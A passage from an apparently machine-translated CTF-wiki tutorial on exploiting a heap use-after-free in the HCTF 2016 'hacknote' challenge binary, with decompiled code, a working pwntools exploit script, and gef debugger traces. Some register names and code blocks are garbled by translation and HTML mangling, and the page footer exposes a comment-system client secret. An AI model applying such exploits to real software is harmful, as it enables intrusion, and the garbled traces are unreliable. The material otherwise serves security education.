        <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">notelist</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>

        <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Success !&quot;</span><span class="p">);</span>

        <span class="o">++</span><span class="n">count</span><span class="p">;</span>

        <span class="k">return</span> <span class="nf">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v5</span><span class="p">;</span>

      <span class="p">}</span>

    <span class="p">}</span>

  <span class="p">}</span>

  <span class="k">else</span>

  <span class="p">{</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Full&quot;</span><span class="p">);</span>

  <span class="p">}</span>

  <span class="k">return</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v5</span><span class="p">;</span>

<span class="p">}</span>
</code></pre></div>
<h4 id="print_note">print_note<a class="headerlink" href="#print_note" title="Permanent link">&para;</a></h4>
<p>Print_note simply outputs the contents of the note corresponding to the index based on the index of the given note.</p>
<div class="highlight"><pre><span></span><code><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">print_note</span><span class="p">()</span>

<span class="p">{</span>

  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [esp+4h] [ebp-14h]</span>

  <span class="kt">char</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [esp+8h] [ebp-10h]</span>

  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [esp+Ch] [ebp-Ch]</span>



<span class="n">v3</span> <span class="o">=</span> <span class="n">__readgsdword</span> <span class="p">(</span><span class="mh">0x14u</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Index :&quot;</span><span class="p">);</span>

  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">4u</span><span class="p">);</span>

<span class="n">v1</span> <span class="o">=</span> <span class="n">atoi</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="n">buf</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">v1</span> <span class="o">&gt;=</span> <span class="n">count</span> <span class="p">)</span>

  <span class="p">{</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Out of bound!&quot;</span><span class="p">);</span>

    <span class="n">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

  <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span> <span class="n">notelist</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="p">)</span>

    <span class="n">notelist</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">put</span><span class="p">(</span><span class="n">notelist</span><span class="p">[</span><span class="n">v1</span><span class="p">]);</span>

  <span class="k">return</span> <span class="nf">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v3</span><span class="p">;</span>

<span class="p">}</span>
</code></pre></div>
<h4 id="delete_note">delete_note<a class="headerlink" href="#delete_note" title="Permanent link">&para;</a></h4>
<p>Delete_note will release the corresponding note based on the given index. However, it is worth noting that when deleting, it is simply free, but not set to NULL, then obviously, there is the case of Use After Free.</p>
<div class="highlight"><pre><span></span><code><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">del_note</span><span class="p">()</span>

<span class="p">{</span>

  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [esp+4h] [ebp-14h]</span>

  <span class="kt">char</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [esp+8h] [ebp-10h]</span>

  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [esp+Ch] [ebp-Ch]</span>



<span class="n">v3</span> <span class="o">=</span> <span class="n">__readgsdword</span> <span class="p">(</span><span class="mh">0x14u</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Index :&quot;</span><span class="p">);</span>

  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">4u</span><span class="p">);</span>

<span class="n">v1</span> <span class="o">=</span> <span class="n">atoi</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="n">buf</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">v1</span> <span class="o">&gt;=</span> <span class="n">count</span> <span class="p">)</span>

  <span class="p">{</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Out of bound!&quot;</span><span class="p">);</span>

    <span class="n">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

  <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span> <span class="n">notelist</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="p">)</span>

  <span class="p">{</span>

    <span class="n">free</span><span class="p">(</span><span class="n">notelist</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">);</span>

    <span class="n">free</span><span class="p">(</span><span class="n">notelist</span><span class="p">[</span><span class="n">v1</span><span class="p">]);</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Success&quot;</span><span class="p">);</span>

  <span class="p">}</span>

  <span class="k">return</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v3</span><span class="p">;</span>

<span class="p">}</span>
</code></pre></div>
<h3 id="utilization-analysis">Utilization Analysis<a class="headerlink" href="#utilization-analysis" title="Permanent link">&para;</a></h3>
<p>We can see that Use After Free may indeed happen, so how can we make it happen and use it? It is also important to note that there is also a magic function in this program. Is it possible to make the program execute the magic function by using after after? <strong> A very straightforward idea is to modify the put field of the note to the address of the magic function, thus implementing the magic function when executing the print note. </strong> So how do you do this?</p>
<p>We can simply look at the specific process of each note generation.</p>
<ol>
<li>The program applies 8-byte memory to store the put and content pointers in the note.</li>
<li>The program requests a memory of the specified size based on the size entered, and then stores the content.<div class="codehilite"><pre><span></span><code>   +-----------------+

   |   put           |

   +-----------------+

   |   content       |       size

   +-----------------+-------------------&gt;+----------------+

                                          |     real       |

                                          |    content     |

                                          |                |

                                          +----------------+
</code></pre></div>

</li>
</ol>
<p>So, according to what we learned in the heap implementation, it is clear that the note is a fastbin chunk (16 bytes in size). Our goal is to have the put field of a note as the function address of magic, then we have to find a way to make the put pointer of a note overwritten as a magic address. Since there is only one place in the program to assign a put. So we have to use the time to write real content to cover. The specific ideas adopted are as follows</p>
<ul>
<li>Apply note0, real content size is 16 (the size is different from the bin where the note size is located)</li>
<li>Apply note1, real content size is 16 (the size is different from the bin where the note size is located)</li>
<li>Release note0</li>
<li>Release note1</li>
<li>At this point, the fast bin chunk size of 16 is note1-&gt;note0</li>
<li>Apply note2 and set the size of real content to 8, then according to the heap allocation rules</li>
<li>note2 will actually allocate the memory block corresponding to note1.</li>
<li>real content The corresponding chunk is actually note0.</li>
<li>If we write the magic address to the chunk part of the note2 real content at this time, then since we don&#39;t have note0 NULL. When we try to output note0 again, the program will call the magic function.</li>
</ul>
<h3 id="using-scripts">Using scripts<a class="headerlink" href="#using-scripts" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>

<span class="c1"># -*- coding: utf-8 -*-</span>



<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>



<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./hacknote&#39;</span><span class="p">)</span>





<span class="k">def</span> <span class="nf">addnote</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>

    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>

    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>

    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>

    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>

    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>

    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>





<span class="k">def</span> <span class="nf">delnote</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>

    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>

    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>

    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>

    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>





<span class="k">def</span> <span class="nf">printnote</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>

    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>

    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;3&quot;</span><span class="p">)</span>

    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>

    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>





<span class="c1">#gdb.attach(r)</span>

<span class="n">magic</span> <span class="o">=</span> <span class="mh">0x08048986</span>



<span class="n">addnote</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="s2">&quot;aaaa&quot;</span><span class="p">)</span> <span class="c1"># add note 0</span>

<span class="n">addnote</span> <span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="n">daa</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;)</span> <span class="c1"># add note 1</span>


<span class="n">delnote</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># delete note 0</span>

<span class="n">delnote</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># delete note 1</span>


<span class="n">addnote</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">magic</span><span class="p">))</span> <span class="c1"># add note 2</span>



<span class="n">printnote</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># print note 0</span>



<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
<p>We can look at the execution process specifically, first break down the breakpoint</p>
<p><strong>Two malloc breakpoints</strong></p>
<div class="highlight"><pre><span></span><code>gef➤  b *0x0804875C

Breakpoint <span class="m">1</span> at 0x804875c

gef➤  b *0x080486CA

Breakpoint <span class="m">2</span> at 0x80486ca
</code></pre></div>
<p><strong>Two free breakpoints</strong></p>
<div class="highlight"><pre><span></span><code>gef➤  b *0x08048893

Breakpoint <span class="m">3</span> at 0x8048893

gef➤  b *0x080488A9

Breakpoint <span class="m">4</span> at 0x80488a9
</code></pre></div>
<p>Then continue to execute the program, you can see that when you apply for note0, the requested memory block address is 0x0804b008. (eax storage function return value)</p>
<p><code>`</code>asm
$eax   : 0x0804b008  →  0x00000000</p>
<p>$ebx   : 0x00000000</p>
<p>$ ecx: 0xf7fac780 → 0x00000000
$edx   : 0x0804b008  →  0x00000000</p>
<p>$esp   : 0xffffcf10  →  0x00000008</p>
<p>$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000</p>
<p>$ you are: 0xf7fac000 → 0x001b1db0
$ edi: 0xf7fac000 → 0x001b1db0
$ Eip: 0x080486cf → <add_note+89> add esp, 0x10
$cs    : 0x00000023</p>
<p>$ss    : 0x0000002b</p>
<p>$ds    : 0x0000002b</p>
<p>$ is: 0x0000002b
$fs    : 0x00000000</p>
<p>$gs    : 0x00000063</p>
<p>$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]</p>
<p>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────</p>
<div class="codehilite"><pre><span></span><code>0x80486c2 &lt;add_note+76&gt;    add    DWORD PTR [eax], eax

0x80486c4 &lt;add_note+78&gt;    add    BYTE PTR [ebx+0x86a0cec], al

0x80486ca &lt;add_note+84&gt;    call   0x80484e0 &lt;malloc@plt&gt;
</code></pre></div>

<p>→  0x80486cf <add_note+89>    add    esp, 0x10</p>
<div class="codehilite"><pre><span></span><code>0x80486d2 &lt;add_note+92&gt;    mov    edx, eax

0x80486d4 &lt;add_note+94&gt;    mov    eax, DWORD PTR [ebp-0x1c]

0x80486d7 &lt;add_note+97&gt;    mov    DWORD PTR [eax*4+0x804a070], edx
</code></pre></div>

<p>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────</p>
<p>['0xffffcf10', 'l8']</p>
<p>8</p>
<p>0xffffcf10│+0x00: 0x00000008     ← $esp</p>
<p>0xffffcf14│+0x04: 0x00000000</p>
<p>0xffffcf18│+0x08: 0xf7e29ef5  →  <strtol+5> add eax, 0x18210b</p>
<p>0xffffcf1c│+0x0c: 0xf7e27260  →  <atoi+16> add esp, 0x1c</p>
<p>0xffffcf20│+0x10: 0xffffcf58  →  0xffff0a31  →  0x00000000</p>
<p>0xffffcf24│+0x14: 0x00000000</p>
<p>0xffffcf28│+0x18: 0x0000000a</p>
<p>0xffffcf2c│+0x1c: 0x00000000</p>
<p>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────</p>
<p>---Type <return> to continue, or q <return> to quit---</p>
<p>[#0] 0x80486cf → Name: add_note()</p>
<p>[#1] 0x8048ac5 → Name: main()</p>
<p>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</p>
<p>gef➤  heap chunk 0x0804b008</p>
<p>UsedChunk(addr=0x804b008, size=0x10)</p>
<p>Chunk size: 16 (0x10)</p>
<p>Usable size: 12 (0xc)</p>
<p>Previous chunk size: 0 (0x0)</p>
<p>PREV_INUSE flag: On</p>
<p>IS_MMAPPED flag: Off</p>
<p>NON_MAIN_ARENA flag: Off</p>
<div class="highlight"><pre><span></span><code>**The address of the content of the application note 0 is 0x0804b018**


`` `asm
$eax   : 0x0804b018  →  0x00000000

$ebx   : 0x0804b008  →  0x0804865b  →  &lt;print_note_content+0&gt; push ebp

$ ecx: 0xf7fac780 → 0x00000000
$edx   : 0x0804b018  →  0x00000000

$esp   : 0xffffcf10  →  0x00000020

$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000

$ you are: 0xf7fac000 → 0x001b1db0
$ edi: 0xf7fac000 → 0x001b1db0
$ Eip: 0x08048761 → &lt;add_note+235&gt; add esp, 0x10
$cs    : 0x00000023

$ss    : 0x0000002b

$ds    : 0x0000002b

$ is: 0x0000002b
$fs    : 0x00000000

$gs    : 0x00000063

$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]

──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────

    0x8048752 &lt;add_note+220&gt;   mov    al, ds:0x458b0804

    0x8048757 &lt;add_note+225&gt;   call   0x581173df

    0x804875c &lt;add_note+230&gt;   call   0x80484e0 &lt;malloc@plt&gt;

 →  0x8048761 &lt;add_note+235&gt;   add    esp, 0x10

    0x8048764 &lt;add_note+238&gt;   mov    DWORD PTR [ebx+0x4], eax

    0x8048767 &lt;add_note+241&gt;   mov    eax, DWORD PTR [ebp-0x1c]

    0x804876a &lt;add_note+244&gt;   mov    eax, DWORD PTR [eax*4+0x804a070]

──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────

[&#39;0xffffcf10&#39;, &#39;l8&#39;]

8

0xffffcf10│+0x00: 0x00000020     ← $esp

0xffffcf14│+0x04: 0xffffcf34  →  0xf70a3233

0xffffcf18│+0x08: 0x00000008

0xffffcf1c│+0x0c: 0xf7e27260  →  &lt;atoi+16&gt; add esp, 0x1c

0xffffcf20│+0x10: 0xffffcf58  →  0xffff0a31  →  0x00000000

0xffffcf24│+0x14: 0x00000000

0xffffcf28│+0x18: 0x0000000a

0xffffcf2c│+0x1c: 0x00000000

──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────

---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---

[#0] 0x8048761 → Name: add_note()

[#1] 0x8048ac5 → Name: main()

───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

gef➤  heap chunk 0x0804b018

UsedChunk(addr=0x804b018, size=0x28)

Chunk size: 40 (0x28)

Usable size: 36 (0x24)
Previous chunk size: 0 (0x0)

PREV_INUSE flag: On

IS_MMAPPED flag: Off

NON_MAIN_ARENA flag: Off
</code></pre></div>
<p>Similarly, we can get the address of note1 and the address of its content are 0x0804b040 and 0x0804b050 respectively.</p>
<p>At the same time, we can also see that the content corresponding to note0 and note1 is indeed the corresponding memory block.</p>
<p><code>`</code>asm
given grip
[+] Searching 'aaaa' in memory</p>
<p>[+] In '[heap]'(0x804b000-0x806c000), permission=rw-</p>
<p>0x804b018 - 0x804b01c  →   "aaaa" </p>
<p>grap daa
[+] Searching &#39;deaa&#39; in memory
[+] In '[heap]'(0x804b000-0x806c000), permission=rw-</p>
<p>0x804b050 - 0x804b054 → &quot;good&quot;
<div class="highlight"><pre><span></span><code>Here is the free process. We can find in turn that the content of note0 is free first.


`` `asm
 →  0x8048893 &lt;del_note+143&gt;   call   0x80484c0 &lt;free@plt&gt;

   ↳   0x80484c0 &lt;free@plt+0&gt;     jmp    DWORD PTR ds:0x804a018

       0x80484c6 &lt;free@plt+6&gt;     push   0x18

0x80484cb &lt;free@plt+11&gt; jmp 0x8048480
       0x80484d0 &lt;__stack_chk_fail@plt+0&gt; jmp    DWORD PTR ds:0x804a01c

──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────

[&#39;0xffffcf20&#39;, &#39;l8&#39;]

8

0xffffcf20│+0x00: 0x0804b018  →  &quot;aaaa&quot;  ← $esp
</code></pre></div></p>
<p>Then note0 itself</p>
<p><code>`</code>asm
 →  0x80488a9 <del_note+165>   call   0x80484c0 <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#102;&#114;&#101;&#101;&#64;&#112;&#108;&#116;">&#102;&#114;&#101;&#101;&#64;&#112;&#108;&#116;</a></p>
<p>↳   0x80484c0 <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#102;&#114;&#101;&#101;&#64;&#112;&#108;&#116;&#43;&#48;">&#102;&#114;&#101;&#101;&#64;&#112;&#108;&#116;&#43;&#48;</a>     jmp    DWORD PTR ds:0x804a018</p>
<div class="codehilite"><pre><span></span><code>   0x80484c6 &lt;free@plt+6&gt;     push   0x18
</code></pre></div>

<p>0x80484cb <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#102;&#114;&#101;&#101;&#64;&#112;&#108;&#116;&#43;&#49;&#49;">&#102;&#114;&#101;&#101;&#64;&#112;&#108;&#116;&#43;&#49;&#49;</a> jmp 0x8048480
       0x80484d0 <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#95;&#95;&#115;&#116;&#97;&#99;&#107;&#95;&#99;&#104;&#107;&#95;&#102;&#97;&#105;&#108;&#64;&#112;&#108;&#116;&#43;&#48;">&#95;&#95;&#115;&#116;&#97;&#99;&#107;&#95;&#99;&#104;&#107;&#95;&#102;&#97;&#105;&#108;&#64;&#112;&#108;&#116;&#43;&#48;</a> jmp    DWORD PTR ds:0x804a01c</p>
<p>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────</p>
<p>['0xffffcf20', 'l8']</p>
<p>8</p>
<p>0xffffcf20│+0x00: 0x0804b008  →  0x0804865b  →  <print_note_content+0> push ebp  ← $esp</p>
<div class="highlight"><pre><span></span><code>When the delete is over, let&amp;#39;s take a look at the bins and we can see that it is actually stored in the corresponding fast bin.


```c++

gef➤  heap bins

───────────────────────────────────────────────────────────[ Fastbins for arena 0xf7fac780 ]───────────────────────────────────────────────────────────

Fastbins[idx=0, size=0x8]  ←  UsedChunk(addr=0x804b008, size=0x10) 

Fastbins[idx=1, size=0xc] 0x00

Fastbins[idx=2, size=0x10] 0x00

Fastbins[idx=3, size=0x14]  ←  UsedChunk(addr=0x804b018, size=0x28) 

Fastbins[idx=4, size=0x18] 0x00

Fastbins[idx=5, size=0x1c] 0x00

Fastbins[idx=6, size=0x20] 0x00
</code></pre></div>
<p>After we have deleted all the note1, watch bins again. It can be seen that the chunk block deleted later is indeed in the header.</p>
<p><code>`</code>asm
gef➤  heap bins</p>
<p>───────────────────────────────────────────────────────────[ Fastbins for arena 0xf7fac780 ]───────────────────────────────────────────────────────────</p>
<p>Fastbins[idx=0, size=0x8]  ←  UsedChunk(addr=0x804b040, size=0x10)  ←  UsedChunk(addr=0x804b008, size=0x10) </p>
<p>Fastbins[idx=1, size=0xc] 0x00</p>
<p>Fastbins[idx=2, size=0x10] 0x00</p>
<p>Fastbins[idx=3, size=0x14]  ←  UsedChunk(addr=0x804b050, size=0x28)  ←  UsedChunk(addr=0x804b018, size=0x28) </p>
<p>Fastbins[idx=4, size=0x18] 0x00</p>
<p>Fastbins[idx=5, size=0x1c] 0x00</p>
<p>Fastbins[idx=6, size=0x20] 0x00</p>
<div class="highlight"><pre><span></span><code>Then, at this time, we will apply for note2, we can see what memory block is applied to note2, as follows


**The memory block corresponding to note2 is 0x804b040, which is actually the memory address corresponding to note1. **


`` `asm
[+] Heap-Analysis - malloc(8)=0x804b040

[+] Heap-Analysis - malloc(8)=0x804b040

0x080486cf in add_note ()

──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────

$eax   : 0x0804b040  →  0x0804b000  →  0x00000000

$ebx   : 0x00000000

$ ecx: 0xf7fac780 → 0x00000000
$edx   : 0x0804b040  →  0x0804b000  →  0x00000000

$esp   : 0xffffcf10  →  0x00000008

$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000

$ you are: 0xf7fac000 → 0x001b1db0
$ edi: 0xf7fac000 → 0x001b1db0
$ Eip: 0x080486cf → &lt;add_note+89&gt; add esp, 0x10
$cs    : 0x00000023

$ss    : 0x0000002b

$ds    : 0x0000002b

$ is: 0x0000002b
$fs    : 0x00000000

$gs    : 0x00000063

$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]

──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────

    0x80486c2 &lt;add_note+76&gt;    add    DWORD PTR [eax], eax

    0x80486c4 &lt;add_note+78&gt;    add    BYTE PTR [ebx+0x86a0cec], al

    0x80486ca &lt;add_note+84&gt;    call   0x80484e0 &lt;malloc@plt&gt;

 →  0x80486cf &lt;add_note+89&gt;    add    esp, 0x10
</code></pre></div>
<p><strong>The memory address of the content of the note2 is 0x804b008, which is the address corresponding to note0. That is, when we write the content to the content of note2, the put field of note0 will be overwritten. </strong></p>
<p><code>`</code>asm
gef➤  n 1</p>
<p>[+] Heap-Analysis - malloc(8)=0x804b008</p>
<p>[+] Heap-Analysis - malloc(8)=0x804b008</p>
<p>0x08048761 in add_note ()</p>
<p>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────</p>
<p>$eax   : 0x0804b008  →  0x00000000</p>
<p>$ebx   : 0x0804b040  →  0x0804865b  →  <print_note_content+0> push ebp</p>
<p>$ ecx: 0xf7fac780 → 0x00000000
$edx   : 0x0804b008  →  0x00000000</p>
<p>$esp   : 0xffffcf10  →  0x00000008</p>
<p>$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000
$ you are: 0xf7fac000 → 0x001b1db0
$ edi: 0xf7fac000 → 0x001b1db0
$ Eip: 0x08048761 → <add_note+235> add esp, 0x10
$cs    : 0x00000023</p>
<p>$ss    : 0x0000002b</p>
<p>$ds    : 0x0000002b</p>
<p>$ is: 0x0000002b
$fs    : 0x00000000</p>
<p>$gs    : 0x00000063</p>
<p>$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]</p>
<p>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────</p>
<div class="codehilite"><pre><span></span><code>0x8048752 &lt;add_note+220&gt;   mov    al, ds:0x458b0804

0x8048757 &lt;add_note+225&gt;   call   0x581173df

0x804875c &lt;add_note+230&gt;   call   0x80484e0 &lt;malloc@plt&gt;
</code></pre></div>

<p>→  0x8048761 <add_note+235>   add    esp, 0x10</p>
<div class="highlight"><pre><span></span><code>Let&amp;#39;s examine it in detail. Looking at the situation before the overlay, we can see that the put pointer of the memory block has been set to NULL, which is determined by the free mechanism of fastbin.


`` `asm
gef➤  x/2xw 0x804b008

0x804b008:  0x00000000  0x0804b018
</code></pre></div>
<p>After coverage, the specific values are as follows</p>
<p><code>`</code>asm
gef➤  x/2xw 0x804b008</p>
<p>0x804b008:  0x08048986  0x0804b00a</p>
<p>gef➤  x/i 0x08048986</p>
<p>0x8048986 <magic>:   push   ebp</p>
<div class="highlight"><pre><span></span><code>It can be seen that it has indeed been covered as the magic function we want.


The final execution is as follows


```shell

[+] Starting local process &#39;./hacknote&#39;: pid 35030

[*] Switching to interactive mode

flag{use_after_free}----------------------

       HackNote       

----------------------

 1. Add note          

 2. Delete note       

 3. Print note        

 4. Exit              

----------------------
</code></pre></div>
<p>At the same time, we can also use gef&#39;s heap-analysis-helper to see the application and release of the whole heap, as follows</p>
<p><code>`</code>asm
gef➤  heap-analysis-helper </p>
<p>[*] This feature is under development, expect bugs and unstability...</p>
<p>[+] Tracking malloc()</p>
<p>[+] Tracking free()</p>
<p>[+] Tracking realloc()</p>
<p>[+] Disabling hardware watchpoints (this may increase the latency)</p>
<p>[+] Dynamic breakpoints correctly setup, GEF will break execution if a possible vulnerabity is found.</p>
<p>[*] Note: The heap analysis slows down noticeably the execution. </p>
<p>gef➤  c</p>
<p>Continuing.</p>
<p>[+] Heap-Analysis - malloc(8)=0x804b008</p>
<p>[+] Heap-Analysis - malloc(8)=0x804b008</p>
<p>[+] Heap-Analysis - malloc(32)=0x804b018</p>
<p>[+] Heap-Analysis - malloc(8)=0x804b040</p>
<p>[+] Heap-Analysis - malloc(32)=0x804b050</p>
<p>[+] Heap-Analysis - free(0x804b018)</p>
<p>[+] Heap-Analysis - watching 0x804b018</p>
<p>[+] Heap-Analysis - free(0x804b008)</p>
<p>[+] Heap-Analysis - watching 0x804b008</p>
<p>[+] Heap-Analysis - free(0x804b050)</p>
<p>[+] Heap-Analysis - watching 0x804b050</p>
<p>[+] Heap-Analysis - free(0x804b040)</p>
<p>[+] Heap-Analysis - watching 0x804b040</p>
<p>[+] Heap-Analysis - malloc(8)=0x804b040</p>
<p>[+] Heap-Analysis - malloc(8)=0x804b008</p>
<p>[+] Heap-Analysis - Cleaning up</p>
<p>[+] Heap-Analysis - Re-enabling hardware watchpoints</p>
<p>[New process 36248]</p>
<p>process 36248 is executing new program: /bin/dash</p>
<p>[New process 36249]</p>
<p>process 36249 is executing new program: /bin/cat</p>
<p>[Inferior 3 (process 36249) exited normally]</p>
<p>```</p>
<p>The first output here is twice, it should be a problem with the gef tool.</p>
<h2 id="topic">topic<a class="headerlink" href="#topic" title="Permanent link">&para;</a></h2>
<ul>
<li>2016 HCTF mount</li>
</ul>
                
              
              
                <!-- Set from config but allow override -->
   

<hr>
<blockquote class="page-copyright">
    <p>本页面的全部内容在 <strong>CC BY-NC-SA 4.0</strong> 协议之条款下提供，附加条款亦可能应用。</p>
</blockquote>
<!-- Comments Integration -->
 
<h2 id="__comments">评论</h2>
<form id="gitalk-form" onsubmit="return false;">
    <div id="gitalk-container"></div>
</form>
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
<script src="https://cdnjs.loli.net/ajax/libs/blueimp-md5/2.10.0/js/md5.min.js"></script>
<script>
    const gitalk = new Gitalk({
        clientID: 'd78d2e8d782d95560289',
        clientSecret: '954f1e7f8ae9b2566272a2105fe8df60b50e8e9b',
        repo: 'comment',
        owner: 'ctf-wiki',
        admin: ['40huo', 'iromise'],
        id: md5(location.pathname),      // Ensure uniqueness and length less than 50
        distractionFreeMode: false  // Facebook-like distraction free mode
    })

    gitalk.render('gitalk-container')
</script> 
              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
